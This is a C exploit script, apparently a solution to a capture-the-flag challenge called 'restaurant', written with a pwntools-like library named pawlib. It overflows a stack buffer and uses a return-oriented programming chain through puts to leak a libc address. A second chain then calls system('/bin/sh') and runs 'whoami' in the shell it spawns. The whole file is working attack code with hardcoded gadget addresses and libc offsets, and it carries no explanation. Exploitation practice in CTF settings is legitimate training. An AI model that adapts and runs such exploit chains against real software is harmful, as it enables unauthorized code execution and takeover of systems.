#include <pawlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
int main() {

  t_process p = paw_open_process("./restaurant_patched");
  p.log_level = 0;

  int rip_offset = 40;

  addr_t ret = 0x40063e;
  addr_t pop_rdi_ret = 0x4010a3;

  addr_t puts_got = 0x601fa8;
  addr_t puts_plt = 0x400650;

  addr_t puts_libc = 0x000000000080aa0;
  addr_t system_libc = 0x00000000004f550;
  addr_t binsh_libc = 0x01b3e1a;

  addr_t main = 0x0000000000400f68;

  t_data payload = paw_init_data();

  paw_add(&payload, "1", 1);

  paw_recvuntil(p, ">", 1);
  paw_sendline(p, payload);

  t_data payload2 = paw_init_data();

  paw_add_repeat(&payload2, "A", 1 , rip_offset);
  paw_add_p64(&payload2, pop_rdi_ret);
  paw_add_p64(&payload2, puts_got);
  paw_add_p64(&payload2, puts_plt);
  paw_add_p64(&payload2, main);

  paw_send(p, payload2);

  paw_recvuntil(p, "Enjoy your ", 11);

  paw_recv(p, rip_offset);

  paw_recv(p, 3);

  addr_t libc = paw_u64(paw_recv(p, 6));
  libc -= puts_libc;

  t_data payload3 = paw_init_data();

  paw_add_repeat(&payload3, "A", 1 , rip_offset);
  paw_add_p64(&payload3, ret);
  paw_add_p64(&payload3, pop_rdi_ret);
  paw_add_p64(&payload3, binsh_libc + libc);
  paw_add_p64(&payload3, system_libc + libc);

  paw_recvuntil(p, ">", 1);
  paw_sendline(p, payload);
  paw_recvuntil(p, ">", 1);
  paw_sendline(p, payload3);

  t_data payload4 = paw_init_data();
  paw_add(&payload4, "whoami", 6);
  paw_recv(p, 200);
  paw_sendline(p, payload4);
  paw_recv(p, 200);
}
